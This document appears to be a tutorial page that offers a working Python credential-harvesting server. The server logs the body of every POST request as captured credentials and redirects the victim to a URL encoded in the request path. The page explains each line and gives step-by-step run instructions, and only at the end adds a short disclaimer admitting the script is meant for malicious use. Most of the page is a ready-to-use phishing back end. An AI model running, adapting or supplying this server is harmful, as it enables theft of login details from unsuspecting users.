# Simple HTTP Server for Capturing Credentials

This script is a simple HTTP server that listens on port `8080` and handles POST requests. When a POST request is made, it extracts the credentials from the request body, prints them to the console, and redirects the client to another URL

```python
import http.server
import socketserver
import urllib.error
import urllib.parse
import urllib.request

class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        creds = self.rfile.read(content_length).decode('utf-8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header("Location", urllib.parse.unquote(site))
        self.end_headers()
        
server = socketserver.TCPServer(("0.0.0.0", 8080), CredRequestHandler)
server.serve_forever()
```

#### Key Components of the Code:

1. **Libraries Used**:
   - **`http.server`**: Provides basic HTTP server functionality, particularly for handling HTTP requests like GET and POST.
   - **`socketserver`**: Helps in setting up the TCP server to listen for incoming requests.
   - **`urllib.parse`**: Used to manipulate and decode URLs.

2. **Class: `CredRequestHandler`**:
   This is a subclass of `http.server.SimpleHTTPRequestHandler`, which is responsible for handling HTTP requests. Specifically:
   - **`do_POST(self)`**: This method handles POST requests. Here's the breakdown of the process:
     - **`content_length`**: Extracts the length of the incoming request's body (in bytes).
     - **`creds`**: Reads the request body (which is expected to contain the credentials) and decodes it into a UTF-8 string.
     - **`site`**: Extracts the URL to redirect the client to from the path of the incoming request. This assumes the path contains the target URL encoded as part of the URL.
     - **Response**: After processing the credentials, it sends an HTTP redirect (`301`) to the target URL extracted from the request path.

3. **Server Setup**:
   - **`server = socketserver.TCPServer(("0.0.0.0", 8080), CredRequestHandler)`**: This line sets up the HTTP server to listen on all network interfaces (`0.0.0.0`) on port `8080`. The `CredRequestHandler` will handle the requests.
   - **`server.serve_forever()`**: This starts the server, which will continuously listen for incoming requests.

#### Workflow:

1. **Listening for POST Requests**:
   - The server listens on port `8080` for incoming HTTP requests. When a POST request is received, it processes the request using the `do_POST()` method.
   
2. **Processing the Request**:
   - The server reads the credentials from the body of the POST request and prints them to the console (`print(creds)`).
   
3. **Redirecting**:
   - After printing the credentials, the server performs an HTTP 301 redirect to the URL extracted from the request's path. The URL is decoded using `urllib.parse.unquote()` to ensure that any percent-encoded characters in the URL are properly decoded.

#### How to Run:

To run this server, you need to have Python installed.

1. **Save the Script**:
   - Save the script to a `.py` file (e.g., `cred_server.py`).
   
2. **Run the Server**:
   - Open a terminal or command prompt and run the script using Python:
     ```bash
     python cred_server.py
     ```
   
3. **Listening**:
   - The server will now listen for POST requests on port `8080` and print any credentials it receives in the POST body to the console. Afterward, it will redirect the request to the URL contained in the path of the POST request.

#### Ethical Concerns:
This script is designed for malicious use as it intercepts and captures credentials, which is illegal and unethical. It's essential to understand that using such a server to capture login details or other sensitive information without consent violates privacy laws and cybersecurity ethics. 

**Please do not use this script for any unauthorized or malicious purposes.**
